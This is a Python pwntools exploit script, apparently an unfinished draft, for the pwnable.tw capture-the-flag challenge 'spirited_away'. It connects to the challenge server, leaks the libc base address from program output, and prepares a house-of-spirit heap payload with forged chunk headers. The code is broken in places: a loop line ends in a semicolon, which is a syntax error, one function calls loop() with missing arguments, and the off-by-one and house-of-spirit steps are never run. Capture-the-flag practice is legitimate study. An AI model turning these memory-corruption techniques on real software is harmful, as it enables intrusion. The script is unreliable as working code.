#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./spirited_away", env = {"LD_PRELOAD": "./libc_32.so.6"})

else:
    io = remote("chall.pwnable.tw", 10204)

elf = ELF("./spirited_away")
libc = ELF("./libc_32.so.6")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def loop(name, age, reason, comment, finish = False):
    io.sendlineafter("name: ", name)
    io.sendlineafter("age: ", str(age))
    #  DEBUG()
    io.sendafter("movie? ", reason)
    io.sendafter("comment: ", comment)
    #  if finish == False:
        #  io.sendlineafter("<y/n>: ", "y")
    #  else:
        #  io.sendlineafter("<y/n>: ", "n")

def getBase():
    loop("M4x", 21, "|" * 0x18, "comment")

    libcBase = u32(io.recvuntil("\xf7")[-4: ]) - libc.sym[u'_IO_file_sync'] - 7
    success("libcBase -> {:#x}".format(libcBase))
    pause()
    return libcBase

def offByOne():
    for i in xrange(100);
        loop("M4x", 21, "|" * 0x18, "comment")
        io.sendlineafter("<y/n>: ", "y")

def houseOfSpirit():
    payload = p32(0) + p32(0x41) + cyclic(56) + p32(0) + p32(0x41)
    loop("M4x", 21, payload)
if __name__ == "__main__":
    libcBase = getBase()
    
    io.interactive()
    io.close()

